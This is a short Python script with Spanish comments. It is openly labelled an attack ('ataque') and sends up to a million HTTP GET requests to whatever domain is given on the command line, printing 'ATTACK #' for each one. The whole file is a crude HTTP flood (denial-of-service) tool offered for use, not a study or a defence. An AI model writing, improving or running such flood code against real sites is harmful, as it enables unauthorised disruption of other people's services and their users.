import sys
import threading
import requests

def ataque(dominio):
    print('DOMAIN ' + str(dominio))
    print('ATTACK START')
    num_max = 1000000  # Número máximo de ataques
    success_count = 0  # Contador de solicitudes exitosas
    failure_count = 0  # Contador de solicitudes fallidas

    for x in range(num_max):
        try:
            response = requests.get(dominio)
            if response.status_code == 200:
                success_count += 1
            else:
                failure_count += 1
            print('ATTACK #' + str(success_count + failure_count))
        except:
            failure_count += 1
            print('ATTACK #' + str(success_count + failure_count))

    print('ATTACK COMPLETE')
    print('Successful requests:', success_count)
    print('Failed requests:', failure_count)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('Debe proporcionar un dominio como argumento de línea de comandos.')
        sys.exit(1)

    dominio = sys.argv[1]
    t = threading.Thread(target=ataque, args=(dominio,))
    t.start()
